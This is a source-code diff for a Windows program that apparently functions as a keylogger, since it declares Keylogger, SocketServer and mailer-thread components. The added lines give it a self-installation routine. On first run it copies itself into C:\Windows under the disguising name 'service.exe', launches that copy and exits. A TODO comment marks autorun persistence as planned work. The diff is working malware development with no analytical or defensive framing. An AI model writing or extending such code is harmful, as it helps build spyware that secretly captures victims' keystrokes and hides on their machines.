@@ -28,6 +28,7 @@ extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
 #define SECONDS_IN_DAY 86400
 #define CHECK_TIME_INTERVAL 1800
+#define PROGRAM_NAME L"service.exe"
 
 shared_ptr<Keylogger> logger;
 shared_ptr<SocketServer> socketServer;
@@ -40,12 +41,33 @@ void mailerThreadProc();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
-
 	// Add console for debug
 	AllocConsole();
 	freopen("CONOUT$", "w", stdout);
 	//_setmode(_fileno(stdout), _O_U8TEXT);
 	freopen("CONOUT$", "w", stderr);
+
+	// Check if the first run on this computer
+	const int buffSize = 1024;
+	wchar_t buff[1024];
+	GetModuleFileName(NULL, buff, buffSize);
+	std::wstring path = std::wstring(buff);
+	GetWindowsDirectory(buff, buffSize);
+	std::wstring winDir = L"C:\\Windows";
+	if (path.find(winDir) != 0) {
+		// Copy self to windir
+		std::wstring newPath = winDir + L"\\" + PROGRAM_NAME;
+		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
+		if (result) {
+			std::cout << "copied";
+		} else {
+			std::cout << "err";
+		}
+
+		system(StringUtilities::ws2s(newPath).c_str());
+		// TODO add copied exe to autorun
+		ExitProcess(0);
+	}
 
 	MSG msg;
 	WNDCLASS wndClass;
